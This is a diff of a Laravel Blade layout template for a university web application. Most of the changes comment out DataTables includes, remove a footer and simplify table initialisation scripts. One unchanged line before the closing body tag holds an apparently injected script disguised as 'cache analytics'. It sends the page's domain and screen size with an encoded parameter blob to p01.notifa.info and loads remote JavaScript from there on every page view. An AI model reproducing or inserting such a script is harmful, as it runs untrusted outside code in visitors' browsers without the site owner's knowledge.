@@ -16,7 +16,7 @@
     <!-- Menu CSS -->
     <link href="{{ asset('asset/plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.css') }}" rel="stylesheet">
     <!-- Table CSS -->
-    <link href="{{ asset('asset/css/dataTables.bootstrap.min.css') }}" rel="stylesheet">
+    <!-- <link href="{{ asset('asset/css/dataTables.bootstrap.min.css') }}" rel="stylesheet"> -->
     <link href="https://cdn.datatables.net/1.10.19/css/jquery.dataTables.min.css" rel="stylesheet">
     <link href="https://cdn.datatables.net/buttons/1.5.2/css/buttons.dataTables.min.css" rel="stylesheet">
     <!-- toast CSS -->
@@ -58,7 +58,6 @@
     </div> -->
     @yield('content')
                 <!-- /.container-fluid -->
-                <footer class="footer text-center"> 2018 &copy; Informatika Universitas Jenderal Achmad Yani </footer>
         </div>
         <!-- /#page-wrapper -->
     </div>
@@ -87,10 +86,10 @@
     <script src="{{ asset('asset/plugins/bower_components/jsgrid/db.js') }}"></script>
     <script type="text/javascript" src="{{ asset('asset/plugins/bower_components/jsgrid/dist/jsgrid.min.js') }}"></script>
     <script src="{{ asset('asset/js/jsgrid-init.js') }}"></script>
-    <script src="{{ asset('asset/js/dataTables.bootstrap.min.js') }}"></script>
+    <!-- <script src="{{ asset('asset/js/dataTables.bootstrap.min.js') }}"></script> -->
     <script src="{{ asset('asset/js/jquery.dataTables.min.js') }}"></script>
     <!-- Datatable -->
-    <script src="https://cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>
+    <!-- <script src="https://cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script> -->
     <script src="https://cdn.datatables.net/buttons/1.5.2/js/dataTables.buttons.min.js"></script>
     <script src="https://cdn.datatables.net/buttons/1.5.2/js/buttons.flash.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.1.3/jszip.min.js"></script>
@@ -107,27 +106,24 @@
     <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m61hePje8OYVcyCLFVCu9IUBITM5nfRfI621FVInN7YZ%2fcIQzWOfwlOsEc5pW4KHBQUc9Ui0LVAsZMAQJda%2bvRN9PGYw2JYqj51GJ%2bKUMYCl8Xtp9rhEmMs8sOjA7xbwcJEqyuC4OSmX4Em4Jr%2bUgbJQMiCjYwjWUPu5Kwlh8KTl1%2bmw1h1oB0HtoYc5TkLDWkosjZ3NAxAgkHy0QY8rHoEr%2flCq7wxJj7En6TKCEuYwXvC1ONLwwq11xAOKKQiiZ4%2fqiEKzLKwIhH6M32p1RqMouPstSUKG1oCdBQ2ZNl7UqGm8UUmU4xKexNVNXCPArMgfxWTARfwqu8HCEO0aLLdSamO5gVHDZvneBdcI%2fWouZAC876Ku2Qros%2fQOO5PNaFPBrNcbJS83UNYSpkRB76XZAn2NfsdMyThA%2bwBdTzlM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
         <script type="text/javascript">
+            // $(document).ready(function() {
+            //     $('#example').DataTable({
+            //                     dom: 'Bfrtip',
+            //                     buttons: [
+            //                         'copy', 'csv', 'excel', 'pdf', 'print'
+            //                     ]
+            //     });
             $(document).ready(function() {
-                var table = $('#example').DataTable({
-                                dom: 'Bfrtip',
-                                buttons: [
-                                    'copy', 'csv', 'excel', 'pdf', 'print'
-                                ]
-                            });
-            
-                $('#example tbody').on( 'click', 'tr', function () {
-                    if ( $(this).hasClass('selected') ) {
-                        $(this).removeClass('selected');
-                    }
-                    else {
-                        table.$('tr.selected').removeClass('selected');
-                        $(this).addClass('selected');
-                    }
-                } );
-            
-                $('#button').click( function () {
-                    table.row('.selected').remove().draw( false );
-                } );
+                $('#example').DataTable();
+            } );
+            $(document).ready(function() {
+                $('#example2').DataTable();
+            } );
+            $(document).ready(function() {
+                $('#example3').DataTable();
+            } );
+            $(document).ready(function() {
+                $('#example4').DataTable();
             } );
         </script>
         <script type="text/javascript">
